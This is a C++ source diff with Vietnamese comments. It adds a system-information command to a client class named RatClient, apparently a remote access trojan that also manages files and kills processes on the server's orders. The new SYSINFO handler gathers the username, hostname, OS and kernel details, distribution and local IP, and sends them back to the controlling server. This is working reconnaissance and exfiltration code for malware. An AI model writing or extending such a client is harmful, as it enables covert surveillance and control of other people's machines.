@@ -364,6 +364,81 @@ void ProcessManager::HandleKillProcess(const std::string& pid) {
 
 
 
+class SystemInfo {
+public:
+    SocketClient client;
+    void HandleSysInfo();
+};
+
+// Hàm lấy thông tin chung của hệ thống Client
+void SystemInfo::HandleSysInfo() {
+    std::string info = "\n=== THONG TIN HE THONG CLIENT ===\n";
+
+    // 1. Lấy Username
+    char username[256];
+    if (getlogin_r(username, sizeof(username)) != 0) {
+        // Cách phòng cua nếu getlogin_r thất bại trong môi trường dịch vụ ngầm
+        char* envUser = getenv("USER");
+        if (envUser != nullptr) {
+            snprintf(username, sizeof(username), "%s", envUser);
+        } else {
+            snprintf(username, sizeof(username), "Unknown");
+        }
+    }
+    info += "Username: " + std::string(username) + "\n";
+
+    // 2. Lấy Computer Name (Hostname)
+    char hostname[256];
+    if (gethostname(hostname, sizeof(hostname)) == 0) {
+        info += "Computer Name: " + std::string(hostname) + "\n";
+    } else {
+        info += "Computer Name: Unknown\n";
+    }
+
+    // 3. Lấy Thông tin Hệ điều hành (OS và Nhân Kernel)
+    struct utsname osInfo;
+    if (uname(&osInfo) == 0) {
+        info += "OS Type: " + std::string(osInfo.sysname) + "\n";
+        info += "Kernel Version: " + std::string(osInfo.release) + "\n";
+        info += "Architecture: " + std::string(osInfo.machine) + "\n";
+    }
+
+    // 4. Lấy chi tiết phiên bản phân phối (Ví dụ: Ubuntu/Debian...) bằng cách đọc /etc/issue
+    std::ifstream issueFile("/etc/issue");
+    if (issueFile.is_open()) {
+        std::string line;
+        if (std::getline(issueFile, line)) {
+            // Xóa bớt các ký tự định dạng trống ở cuối dòng nếu có
+            size_t end = line.find_first_of("\\");
+            if (end != std::string::npos) line = line.substr(0, end);
+            info += "OS Distribution: " + line + "\n";
+        }
+        issueFile.close();
+    }
+
+    // 5. Lấy thông tin địa chỉ IP nội bộ (Internal IP) bằng cách đọc danh sách card mạng đơn giản
+    // Sử dụng lệnh "hostname -I" để lấy nhanh IP đã cấp phát
+    FILE* pipe = popen("hostname -I", "r");
+    if (pipe) {
+        char ipBuffer[128];
+        if (fgets(ipBuffer, sizeof(ipBuffer), pipe) != nullptr) {
+            std::string ipStr(ipBuffer);
+            // Xóa ký tự xuống dòng thừa
+            if (!ipStr.empty() && ipStr.back() == '\n') ipStr.pop_back();
+            info += "Local IP: " + ipStr + "\n";
+        }
+        pclose(pipe);
+    }
+
+    info += "=================================\n";
+
+    // Gửi toàn bộ chuỗi thông tin về cho Server
+    client.Send(info);
+    std::cout << "[+] Da gui thong tin he thong ve Server." << std::endl;
+}
+
+
+
 class RatClient {
 public:
     void Start();
@@ -372,6 +447,7 @@ private:
     SocketClient client;
     FileManager fileManager;
     ProcessManager processManager;
+    SystemInfo systemInfo;
 
     void InitClientSocket();
     void Listen();
@@ -467,6 +543,9 @@ void RatClient::HandleCommand(const std::string& command) {
     else if (command.rfind("CREATEFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh CREATEFILE
         std::string filename = command.substr(11);
         fileManager.HandleCreateFile(filename);
+    }
+    else if (command == "SYSINFO") { // Thêm nhánh xử lý lệnh SYSINFO
+        systemInfo.HandleSysInfo();
     }
 }
 
